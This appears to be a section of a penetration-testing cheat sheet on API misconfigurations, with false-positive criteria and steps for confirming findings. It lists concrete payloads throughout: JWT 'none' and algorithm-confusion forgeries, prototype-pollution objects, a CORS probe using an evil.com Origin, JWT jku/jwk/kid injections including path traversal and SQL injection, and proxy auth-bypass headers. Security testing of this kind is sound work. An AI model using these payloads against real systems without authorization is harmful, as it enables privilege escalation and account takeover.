## 12. API SECURITY MISCONFIGURATION

### Mass Assignment
```javascript
User.update(req.body)  // body has {"role": "admin"} → privilege escalation
```

### JWT None Algorithm
```python
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": 1, "role": "admin"}
token = base64(header) + "." + base64(payload) + "."  # no signature
```

### JWT RS256 → HS256 Algorithm Confusion
```python
# Get server's public key from /.well-known/jwks.json
# Sign token with public key as HMAC secret
token = jwt.encode({"sub": "admin", "role": "admin"}, pub_key, algorithm="HS256")
# Server uses RS256 key as HS256 secret → accepts it
```

### Prototype Pollution
```javascript
// Server-side — Node.js merge without protection
{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"admin": true}}}
// URL: ?__proto__[isAdmin]=true&__proto__[role]=superadmin
```

### CORS Exploitation
```bash
# Test: reflected origin + credentials
curl -s -I -H "Origin: https://evil.com" https://target.com/api/user/me
# If: Access-Control-Allow-Origin: https://evil.com + Access-Control-Allow-Credentials: true
# → CRITICAL: attacker reads credentialed responses
```
- **Precise conditions:** exploitable only if the response **reflects arbitrary Origin** (or trusts `null`, or a bypassable regex like `app.com.evil.com` / suffix match) **AND** `Allow-Credentials: true` **AND** the endpoint returns secrets. `Allow-Origin: *` **cannot** be combined with credentials by browsers → reading a public endpoint with `*` is **not** a finding (FP-kill). `null` trust is reachable via a `sandbox` iframe.

### JWT Header Injection — jku / jwk / kid
The verifier can be tricked into using an **attacker-chosen key**. Read the token header first (`jwt_tool <token>`), then:
| Header | Attack | Payload |
|---|---|---|
| `jwk` | embed your own public key in the token; lib verifies against it | header `"jwk":{"kty":"RSA","n":"<yours>","e":"AQAB"}`, sign with your priv key |
| `jku` | point to your JWKS URL the server fetches | `"jku":"https://attacker/jwks.json"` (test SSRF allow-list bypass on the host) |
| `kid` path traversal | select a predictable file as the HMAC key | `"kid":"../../dev/null"` → sign with empty key; or `/proc/self/environ` |
| `kid` SQLi | `kid` used in a key-lookup query | `"kid":"x' UNION SELECT 'attacker_key'--"` |
- Tooling: `jwt_tool <token> -X i` (injection modes) / `-X s` (jwks spoof). **Confirm:** the forged token authenticates as another/elevated user; a 200 that also works with **no** token means auth isn't JWT-based (FP-kill).

### API Version Auth Drift
Old API versions often skip authz middleware added later. For every `/v2/` endpoint, replay against `/v1/`, `/v3/`, `/internal/`, `/beta/`, and undocumented `/api/mobile/`. Same object, weaker guard = IDOR/authz bypass.

### Header-Based Auth Bypass (reverse-proxy trust)
Front proxy enforces auth on a path; backend re-routes on a header the proxy forgot to strip:
```
X-Original-URL: /admin        ·  X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1     ·  X-Forwarded-Host: internal
X-Forwarded-Path / X-Custom-IP-Authorization: 127.0.0.1
```
Send to a **403/401** path and watch for it flipping to 200. Confirm the privileged content actually renders (not just a status change).
